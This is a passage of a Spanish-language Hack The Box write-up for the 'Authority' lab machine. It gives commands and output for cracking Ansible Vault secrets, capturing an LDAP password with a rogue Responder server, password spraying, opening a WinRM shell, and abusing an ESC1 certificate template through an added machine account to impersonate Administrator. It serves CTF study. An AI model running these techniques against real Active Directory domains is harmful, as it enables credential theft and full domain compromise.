Ansible/LDAP/README.md:|`system_ldap_access_filter_users`|`- hoshimiya.ichigo`<br />`- nikaidou.yuzu`|List of usernames (passed to the filter `(sAMAccountName=%s)` by default) authorized to access the current host.|
Ansible/LDAP/README.md:|`system_ldap_allow_passwordauth_in_sshd`|`true`|Specifies whether to configure `sshd_config` to allow password authentication for authorized users. This is needed if your SSHD is configured to not allow password authentication by default. Defaults to `false`.|
Ansible/LDAP/README.md:    system_ldap_bind_password: sunrise
Ansible/LDAP/README.md:Here we're using a search user account and password (`system_ldap_bind_*`) to 
Ansible/LDAP/README.md:    system_ldap_allow_passwordauth_in_sshd: true
Ansible/LDAP/Vagrantfile:    ansible.vault_password_file = ".vault_password"
Ansible/LDAP/.bin/smudge_vault:# Just print out the secrets file as-is if the password file doesn't exist
Ansible/LDAP/.bin/smudge_vault:if [ ! -r '.vault_password' ]; then
Ansible/LDAP/.bin/smudge_vault:    RESULT="$(echo "$CONTENT" | ansible-vault decrypt - --vault-password-file=.vault_password 2>&1 1>&$OUT)";
Ansible/LDAP/.bin/clean_vault:# Just print out the secrets file as-is if the password file doesn't exist
Ansible/LDAP/.bin/clean_vault:if [ ! -r '.vault_password' ]; then
Ansible/LDAP/.bin/clean_vault:    RESULT="$(echo "$CONTENT" | ansible-vault encrypt - --vault-password-file=.vault_password 2>&1 1>&$OUT)";
Ansible/LDAP/.bin/diff_vault:# Just print out the secrets file as-is if the password file doesn't exist
Ansible/LDAP/.bin/diff_vault:if [ ! -r '.vault_password' ]; then
Ansible/LDAP/.bin/diff_vault:CONTENT="$(ansible-vault view "$1" --vault-password-file=.vault_password 2>&1)"
Ansible/LDAP/TODO.md:- Change LDAP admin password after build -[COMPLETE]
Ansible/LDAP/templates/sssd.conf.j2:chpass_provider = ldap
Ansible/LDAP/templates/sssd.conf.j2:ldap_default_authtok_type = password
Ansible/LDAP/templates/sssd.conf.j2:ldap_default_authtok = \{\{ system_ldap_bind_password \}\}
Ansible/LDAP/templates/sssd.conf.j2:cache_credentials = True
Ansible/LDAP/.travis.yml:  - echo "$VAULT_PASSWORD" > .vault_password
Ansible/LDAP/.travis.yml:  - ansible-playbook tests/travis.yml -i localhost, --vault-password-file .vault_password --syntax-check
```

Recibo mucho output, filtraré por archivos que contengan estas palabras clave.

```shell
❯ grep -Eir "pass|password|cred" -l
Ansible/PWM/defaults/main.yml
Ansible/PWM/README.md
Ansible/PWM/ansible_inventory
Ansible/PWM/templates/tomcat-users.xml.j2
Ansible/ADCS/tox.ini
Ansible/ADCS/tasks/generate_ca_certs.yml
Ansible/ADCS/tasks/assert.yml
Ansible/ADCS/tasks/requests.yml
Ansible/ADCS/tasks/init_ca.yml
Ansible/ADCS/defaults/main.yml
Ansible/ADCS/vars/main.yml
Ansible/ADCS/README.md
Ansible/ADCS/templates/openssl.cnf.j2
Ansible/LDAP/tasks/main.yml
Ansible/LDAP/defaults/main.yml
Ansible/LDAP/README.md
Ansible/LDAP/Vagrantfile
Ansible/LDAP/.bin/smudge_vault
Ansible/LDAP/.bin/clean_vault
Ansible/LDAP/.bin/diff_vault
Ansible/LDAP/TODO.md
Ansible/LDAP/templates/sssd.conf.j2
Ansible/LDAP/.travis.yml
```

Al inspeccionar los archivos:

**Ansible/PWM/defaults/main.yml**

```shell
pwm_run_dir: "\{\{ lookup('env', 'PWD') \}\}"

pwm_hostname: authority.htb.corp
pwm_http_port: "\{\{ http_port \}\}"
pwm_https_port: "\{\{ https_port \}\}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          12$ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764      
```

## Cracking Ansible Hashes

Se observan multiples hashes ANSIBLE_VAULT AES256, `JohnTheRipper` tiene una herramienta que permite convertir este formato a un hash creackeable.

```shell
❯ ansible2john
Usage: /usr/bin/ansible2john [Ansible Vault .yml file(s)]
```

**pwn_admin_login.hash.yml**

```shell
❯ catn pwn_admin_login.hash.yml
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a34643137343166643334343436613935653634376333
6662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438
```


```shell
❯ ansible2john pwn_admin_login.hash.yml > pwn_admin_login.hash
                                                                                                                                                                                                                                                                         
❯ ansible2john pwm_admin_password.hash.yml > pwm_admin_password.hash

❯ ansible2john ldap_admin_password.hash.yml > ldap_admin_password.hash
```

```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt pwm_admin_login.hash pwm_admin_password.hash ldap_admin_password.hash
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwm_admin_password.hash.yml)     
!@#$%^&*         (pwn_admin_login.hash.yml)     
!@#$%^&*         (ldap_admin_password.hash.yml)     
3g 0:00:00:14 DONE (2025-12-22 20:46) 0.2130g/s 2836p/s 8509c/s 8509C/s 051790..prospect
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## Decrypting ANSIBLE_VAULT


**pwm_admin_login.hash.yml**

```shell
❯ ansible-vault decrypt pwm_admin_login.hash.yml
Vault password: 
Decryption successful
                                                                                                                                                                                                                                                                         
❯ cat pwm_admin_login.hash.yml
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwm_admin_login.hash.yml
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ svc_pwm
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

**pwm_admin_password.hash.yml**

```shell
❯ ansible-vault decrypt pwm_admin_password.hash.yml
Vault password: 
Decryption successful
                                                                                                                                                                                                                                                                         
❯ cat pwm_admin_password.hash.yml
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwm_admin_password.hash.yml
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ pWm_@dm!N_!23
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

**ldap_admin_password.hash.yml**

```shell
❯ ansible-vault decrypt ldap_admin_password.hash.yml
Vault password: 
Decryption successful

❯ cat ldap_admin_password.hash.yml
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ldap_admin_password.hash.yml
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ DevT3st@123
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Credenciales:

```shell
ldap_admin_password:DevT3st@123
pwm_admin_login:svc_pwm
pwm_admin_password:pWm_@dm!N_!23
```

Para este punto ya cuento con dos credenciales:

```shell
Administrator
Guest
krbtgt
AUTHORITY$
svc_ldap:DevT3st@123
svc_pwm:pWm_@dm!N_!23
```

Las credenciales para LDAP no es valida, además, el usuario `svc_pwm` tiene rol de `Invitado (Guest)`.

```shell
❯ netexec ldap authority.htb.corp -u 'svc_ldap' -p 'DevT3st@123'
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAP        10.129.229.56   389    AUTHORITY        [-] authority.htb\\svc_ldap:DevT3st@123 
                                                                                            
❯ netexec ldap authority.htb.corp -u 'svc_pwm' -p 'pWm_@dm!N_!23'
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAPS       10.129.229.56   636    AUTHORITY        [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090ACD, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAPS       10.129.229.56   636    AUTHORITY        [+] authority.htb\\svc_pwm:pWm_@dm!N_!23 
                                                                                            
❯ netexec smb authority.htb.corp -u 'svc_pwm' -p 'pWm_@dm!N_!23'
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\\svc_pwm:pWm_@dm!N_!23 (Guest)
```

## 8443/TCP - HTTP 

Al ingresar a `https://authority.htb.corp:8443` me redirige hacia `https://authority.htb.corp:8443/pwm/private/login`.
Puede que alguna de mis credenciales sean validas sobre este servicio.

**credentials**
```shell
ldap_admin_password:DevT3st@123
pwm_admin_login:svc_pwm
pwm_admin_password:pWm_@dm!N_!23
```

### https://authority.htb.corp:8443/pwm/private/login

![Desktop View](/assets/img/samples/htb-authority-machine/authoritypwmprivatelogin.png){: w="1280" h="720" }

Probando la credencial de `svc_pwm` resulta en error.

![Desktop View](/assets/img/samples/htb-authority-machine/authoritylogincredentials.png){: w="300" h="75"}

![Desktop View](/assets/img/samples/htb-authority-machine/authorityerrordirectory.png){: w="500" h="300"}

### https://authority.htb.corp:8443/pwm/private/config/login

En Configuration Editor pide ingresar la Configuration Password, intentando la credencial de `svc_pwm` logro acceder a un panel de configuracion.

![Desktop View](/assets/img/samples/htb-authority-machine/authorityconfiglogin.png)

### https://authority.htb.corp:8443/pwm/private/config/editor

A mano izquierda se observan varios modulos: `Default Settings`, `Configuration Notes`, `LDAP`, `Modules`, `Policies`, `Settings`, y `Display Text`

![Desktop View](/assets/img/samples/htb-authority-machine/authorityconfigeditor.png)

Entre estos modulos hay 2 que llaman la atencion, `LDAP` y `Settings`, en `LDAP` > `LDAP Directories` > `Default` > `Connections` hay un panel completo de configuración para conexiones de LDAP.

![Desktop View](/assets/img/samples/htb-authority-machine/authorityldapconfigure.png)

Clickeando sobre Test LDAP Profile arroja un WARN diciendo que no se ha podido establecer una conexión con ldaps://authority.authority.htb:636, además menciona al final “unable to find a valid certification path to requested target”, probablemente el servidor esta manejando certificados.

![Desktop View](/assets/img/samples/htb-authority-machine/authorityprofiledefault.png){: w="500" h="300"}

La idea en este punto es capturar las credenciales que el servidor web está alojando, ya que en el Warning anterior, el servidor solicita una conexión por LDAP como el usuario `svc_ldap` , puede que cada vez que se quiere conectar a ldaps://authority.authority.htb:636 manda la credencial en texto claro o en su defecto encriptada, para esto, `responder` puede echar una mano creando un servidor LDAP falso.

```shell
❯ responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
...[snip]...
```

A pesar que se mande la petición por el puerto 636, ingreso todos los puertos relacionados con LDAP para garantizar que la maquina se conecte a mi servidor.

![Dekstop View](/assets/img/samples/htb-authority-machine/authorityldapurls.png)

Al mandar nuevamente la solicitud, capturo la credencial de `svc_ldap`.

```shell
❯ responder -I tun0 -wv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.179]
    Responder IPv6             [dead:beef:2::10b1]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-V4GB31X2BF9]
    Responder Domain Name      [N9PE.LOCAL]
    Responder DCE-RPC Port     [46625]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: <https://paypal.me/PythonResponder>

[+] Listening for events...

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Ahora que cuento con una nueva crendencial, realizaré un spraying de contraseña sobre algunos servicios implementando mi diccionario de usuarios:

**users**

```shell
Administrator
Guest
krbtgt
AUTHORITY$
svc_ldap
svc_pwm
```

Las crendenciales `svc_ldap:lDaP_1n_th3_cle4r!` son validas sobre SMB y WinRM.

```shell
❯ netexec smb authority.htb.corp -u users -p 'lDaP_1n_th3_cle4r!'
SMB         10.129.13.44    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\Administrator:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\Guest:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\krbtgt:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
SMB         10.129.13.44    445    AUTHORITY        [-] authority.htb\\AUTHORITY$:lDaP_1n_th3_cle4r! STATUS_LOGON_FAILURE 
SMB         10.129.13.44    445    AUTHORITY        [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r!

❯ netexec winrm authority.htb.corp -u users -p 'lDaP_1n_th3_cle4r!'
WINRM       10.129.13.44    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.129.13.44    5985   AUTHORITY        [-] authority.htb\\Administrator:lDaP_1n_th3_cle4r!
WINRM       10.129.13.44    5985   AUTHORITY        [-] authority.htb\\Guest:lDaP_1n_th3_cle4r!
WINRM       10.129.13.44    5985   AUTHORITY        [-] authority.htb\\krbtgt:lDaP_1n_th3_cle4r!
WINRM       10.129.13.44    5985   AUTHORITY        [-] authority.htb\\AUTHORITY$:lDaP_1n_th3_cle4r!
WINRM       10.129.13.44    5985   AUTHORITY        [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

## 5985/TCP - WinRM (Windows Remote Management)

En el Escritorio de `svc_ldap` se encuentra la user flag.

```shell
❯ evil-winrm-py -i authority.htb.corp -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\\ V | | |___\\ V  V | | ' \\| '_| '  |___| '_ | || |
 \\___|\\_/|_|_|    \\_/\\_/|_|_||_|_| |_|_|_|  | .__/\\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'authority.htb.corp:5985' as 'svc_ldap'
evil-winrm-py PS C:\\Users\\svc_ldap\\Documents> whoami
htb\\svc_ldap
```

```powershell
evil-winrm-py PS C:\\Users\\svc_ldap> cd Desktop
evil-winrm-py PS C:\\Users\\svc_ldap\\Desktop> ls

    Directory: C:\\Users\\svc_ldap\\Desktop

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-ar---       12/23/2025   2:33 AM             34 user.txt                                                               

evil-winrm-py PS C:\\Users\\svc_ldap\\Desktop> type user.txt
5be376cff5b4542108932ab22a57e6c5
```

> User Flag: 5be376cff5b4542108932ab22a57e6c5

## Looking for Certificates

Volviendo un poco atras, se ha mencionado la implementación de certificados en el dominio, checaré si efectivamente existen certificados.


```shell
❯ netexec ldap authority.htb.corp -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M adcs
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! 
ADCS        10.129.229.56   389    AUTHORITY        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.229.56   389    AUTHORITY        Found PKI Enrollment Server: authority.authority.htb
ADCS        10.129.229.56   389    AUTHORITY        Found CN: AUTHORITY-CA
```

Encuentra un certificado llamado AUTHORITY-CA, el cual utilizaré posteriormente.

## ESC1

Ya que existen certificados activos en el dominio, buscaré vulnerabilidades relacionadas a la configuración del certificado.


```shell
❯ certipy-ad find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.13.44 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\\Administrators
                                          AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\\Administrators
                                          AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\\Domain Computers
                                          AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\\Administrator
        Full Control Principals         : AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\\Domain Admins
                                          AUTHORITY.HTB\\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
Necesitaré el SID del Administrador, ya sea que lo consiga por `PowerShell`:

```powershell
evil-winrm-py PS C:\\Users\\svc_ldap\\Documents> Get-ADUser -Filter * | where { $_.SID -like “*-500” }

DistinguishedName : CN=Administrator,CN=Users,DC=authority,DC=htb
Enabled           : True
GivenName         : 
Name              : Administrator
ObjectClass       : user
ObjectGUID        : b02012b5-b50a-4044-81fc-08e9fcf42c82
SamAccountName    : Administrator
SID               : S-1-5-21-622327497-3269355298-2248959698-500
Surname           : 
UserPrincipalName : 
```
O con `impacket-lookupsid`.

```shell
❯ impacket-lookupsid 'authority.htb.corp/svc_ldap:lDaP_1n_th3_cle4r!@10.129.229.56'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.229.56
[*] StringBinding ncacn_np:10.129.229.56[\\pipe\\lsarpc]
[*] Domain SID is: S-1-5-21-622327497-3269355298-2248959698
498: HTB\\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: HTB\\Administrator (SidTypeUser)
501: HTB\\Guest (SidTypeUser)
502: HTB\\krbtgt (SidTypeUser)
512: HTB\\Domain Admins (SidTypeGroup)
513: HTB\\Domain Users (SidTypeGroup)
514: HTB\\Domain Guests (SidTypeGroup)
515: HTB\\Domain Computers (SidTypeGroup)
516: HTB\\Domain Controllers (SidTypeGroup)
517: HTB\\Cert Publishers (SidTypeAlias)
518: HTB\\Schema Admins (SidTypeGroup)
519: HTB\\Enterprise Admins (SidTypeGroup)
520: HTB\\Group Policy Creator Owners (SidTypeGroup)
521: HTB\\Read-only Domain Controllers (SidTypeGroup)
522: HTB\\Cloneable Domain Controllers (SidTypeGroup)
525: HTB\\Protected Users (SidTypeGroup)
526: HTB\\Key Admins (SidTypeGroup)
527: HTB\\Enterprise Key Admins (SidTypeGroup)
553: HTB\\RAS and IAS Servers (SidTypeAlias)
571: HTB\\Allowed RODC Password Replication Group (SidTypeAlias)
572: HTB\\Denied RODC Password Replication Group (SidTypeAlias)
1000: HTB\\AUTHORITY$ (SidTypeUser)
1101: HTB\\DnsAdmins (SidTypeAlias)
1102: HTB\\DnsUpdateProxy (SidTypeGroup)
1601: HTB\\svc_ldap (SidTypeUser)
```
Creo un archivo con los datos necesarios para el ataque.

```shell
CA Name : AUTHORITY-CA
DNS Name : auhtority.authority.htb
Template Name : CorpVPN
Owner: AUTHORITY.HTB\\Administrators
Administrator SID : S-1-5-21-622327497-3269355298-2248959698-500
dc-ip : 10.129.229.56

svc_ldap : lDaP_1n_th3_cle4r!
```
Una vez contando con los datos que me pide la herramienta, mando una petición. 

```shell
❯ certipy-ad -debug req -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template 'CorpVPN' -target authority.authority.htb -upn 'Administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.htb -ns 10.129.229.56
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.229.56'
[+] DC IP: None
[+] DC Host: 'authority.htb'
[+] Target IP: None
[+] Remote Name: 'authority.htb'
[+] Domain: 'AUTHORITY.HTB'
[+] Username: 'SVC_LDAP'
[+] Trying to resolve 'authority.htb' at '10.129.229.56'
[+] Resolved 'authority.htb' from cache: 10.129.229.56
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.229.56[\\pipe\\cert]
[+] Connected to endpoint: ncacn_np:10.129.229.56[\\pipe\\cert]
[*] Request ID is 4
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): n
[-] Failed to request certificate
```

Intentando esta escalada, me arroja un error: [-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.

## SeMachineAccountPrivilege

Buscando en Google el error, me encuetro con este github que explica que hacer ante este error:

[https://github.com/ly4k/Certipy/issues/199](https://github.com/ly4k/Certipy/issues/199)

Sugiere en agregar una computadora al dominio con `impacket-addcomputer`, sin embargo, el usuario `svc_ldap` debe de contar con el privilegio `SeMachineAccountPrivilege`, se puede comprobar por fuera y dentro de la máquina.

```shell
❯ netexec ldap authority.htb.corp -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.129.229.56   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
```

```powershell
evil-winrm-py PS C:\\Users\\svc_ldap\\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Efectivamente existe este privilegio dentro del usuario, teniendo hasta 10 máquinas para agregar al dominio.
Agregaré una computadora al dominio.


```shell
❯ impacket-addcomputer -computer-name 'ZYON$' -dc-host authority.authority.htb 'authority.htb.corp/svc_ldap:lDaP_1n_th3_cle4r!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ZYON$ with password fYTW3CX3wtSkqK8OA6Z3egQhxarlPNQ9.
```

Mando nuevamente otra petición pero ahora con mis nuevas crendenciales.

```shell
❯ certipy-ad -debug req -u 'ZYON$@authority.htb' -p 'fYTW3CX3wtSkqK8OA6Z3egQhxarlPNQ9' -ca AUTHORITY-CA -template 'CorpVPN' -target authority.authority.htb -upn 'Administrator@authority.htb' -sid 'S-1-5-21-622327497-3269355298-2248959698-500' -dc-host authority.authority.htb -ns 10.129.229.56
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.229.56'
[+] DC IP: None
[+] DC Host: 'authority.authority.htb'
[+] Target IP: None
[+] Remote Name: 'authority.authority.htb'
[+] Domain: 'AUTHORITY.HTB'
[+] Username: 'ZYON$'
[+] Trying to resolve 'authority.authority.htb' at '10.129.229.56'
[+] Resolved 'authority.authority.htb' from cache: 10.129.229.56
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.229.56[\\pipe\\cert]
[+] Connected to endpoint: ncacn_np:10.129.229.56[\\pipe\\cert]
[*] Request ID is 5
[*] Successfully requested certificate
